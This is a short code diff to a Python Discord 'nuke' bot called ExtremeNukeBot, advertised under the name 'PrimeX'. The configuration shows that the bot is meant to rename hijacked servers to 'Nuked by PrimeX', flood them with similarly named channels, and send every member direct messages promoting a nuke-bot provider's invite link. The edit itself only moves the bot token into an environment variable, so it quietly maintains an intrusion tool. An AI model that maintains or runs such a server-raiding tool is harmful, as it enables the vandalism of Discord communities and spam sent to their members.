@@ -4,15 +4,18 @@ import asyncio
 import aiohttp
 import time
 import random
+import os  # Added to read environment variables
 
 # Configuration
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
 SERVER_NAME = "Nuked by PrimeX"
 CHANNEL_PREFIX = "Nuked By PrimeX"
 SERVER_LOGO_URL = "https://cdn.discordapp.com/attachments/1545360223374413907/1545371272702074951/primex_bots_logo.jpg?ex=6a9e89a7&is=6a9d3827&hm=9f622caf029baf4ef2211b67977542fc0894e49517da747b90e80e40e5a72522"
 SERVER_BANNER_URL = "https://cdn.discordapp.com/attachments/1545360223374413907/1545371463559680081/Prime_x.png?ex=6a9e89d4&is=6a9d3854&hm=8cfae69aa006d97b906d8cec6a04dfb1e49cab0b5cb5ad5771853960eeeba54d"
 NUKE_INVITE_URL = "https://discord.gg/UZgk9gDSx"
 DM_MESSAGE = f"Best Nuke Bot Provider is PrimeX\nJoin here: {NUKE_INVITE_URL}"
+
+# Read Token from Environment Variable or use default placeholder
+BOT_TOKEN = os.environ.get("DISCORD_TOKEN", "YOUR_DEFAULT_TOKEN_PLACEHOLDER")
 
 class ExtremeNukeBot(commands.Bot):
     def __init__(self):
